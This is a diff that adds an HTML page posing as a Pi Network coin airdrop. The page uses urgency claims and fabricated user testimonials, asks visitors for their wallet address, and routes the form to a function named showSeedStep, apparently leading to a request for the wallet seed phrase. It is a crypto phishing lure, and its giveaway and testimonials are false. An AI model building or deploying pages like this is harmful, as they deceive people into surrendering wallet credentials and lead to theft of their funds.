@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Pi Coin Airdrop!</title>
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(to right, #8e44ad, #3498db);
+            padding: 40px;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            animation: fadeIn 1s ease-in;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .container {
+            display: grid;
+            grid-template-columns: 1fr 1.8fr 1fr;
+            max-width: 1200px;
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0px 6px 20px rgba(0, 0, 0, 0.2);
+            color: #333;
+            gap: 30px;
+            transform: scale(0.95);
+            animation: scaleUp 0.5s ease-in-out forwards;
+        }
+        @keyframes scaleUp {
+            to { transform: scale(1); }
+        }
+        .left-section, .right-section {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 20px;
+        }
+        .left-section h2 {
+            color: #8e44ad;
+            margin-bottom: 15px;
+        }
+        .right-section {
+            text-align: center;
+            font-size: 16px;
+            color: #444;
+            position: relative;
+        }
+        .middle-section {
+            text-align: center;
+            padding: 30px;
+        }
+        .middle-section h1 {
+            font-size: 26px;
+            margin-bottom: 20px;
+        }
+        .testimonials {
+            height: 50px;
+            overflow: hidden;
+            position: relative;
+        }
+        .testimonials p {
+            opacity: 0;
+            position: absolute;
+            width: 100%;
+            text-align: center;
+            transition: opacity 1s ease-in-out;
+        }
+        .form-group {
+            margin: 20px 0;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 14px 25px;
+            background: linear-gradient(to right, #ff9800, #ff5722);
+            color: white;
+            text-decoration: none;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            background: linear-gradient(to right, #e68900, #e64a19);
+        }
+        .hidden {
+            display: none;
+        }
+        .loading {
+            display: none;
+            font-size: 20px;
+            color: #ff9800;
+            margin-top: 25px;
+        }
+        .success-message {
+            font-size: 20px;
+            font-weight: bold;
+            color: #27ae60;
+            margin-top: 25px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h2>Pi Network Just Launched Mainnet!</h2>
+            <p>To celebrate, we're giving away free Pi Coins to early claimers! Limited spots available. Act fast before the giveaway ends!</p>
+        </div>
+        <div class="middle-section">
+            <h1>Claim Your Pi Coin Airdrop!</h1>
+            <div id="walletStep">
+                <p>Enter your Pi Wallet Address so we can process your free Pi Coins.</p>
+                <form onsubmit="showSeedStep(event);">
+                    <div class="form-group">
+                        <label for="wallet">Wallet Address</label>
+                        <input type="text" id="wallet" placeholder="Enter your Pi wallet address" required>
+                    </div>
+                    <button type="submit" class="btn">Next</button>
+                </form>
+            </div>
+        </div>
+        <div class="right-section">
+            <h3>Recent Claimers</h3>
+            <div class="testimonials">
+                <p>✅ @johnys - "I just got my free Pi Coins!"</p>
+                <p>✅ @gigamaster - "Super easy process! Thank you!"</p>
+                <p>✅ @crypto_queen - "Pi is the future! Claimed mine today."</p>
+                <p>✅ @blockmaster - "Fast and simple!"</p>
+                <p>✅ @pi_hodler - "Excited for this!"</p>
+            </div>
+        </div>
+    </div>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            let testimonials = document.querySelectorAll(".testimonials p");
+            let index = 0;
+            function showNextTestimonial() {
+                testimonials.forEach((p, i) => {
+                    p.style.opacity = "0";
+                });
+                testimonials[index].style.opacity = "1";
+                index = (index + 1) % testimonials.length;
+                setTimeout(showNextTestimonial, 4000);
+            }
+            showNextTestimonial();
+        });
+    </script>
+</body>
+</html>
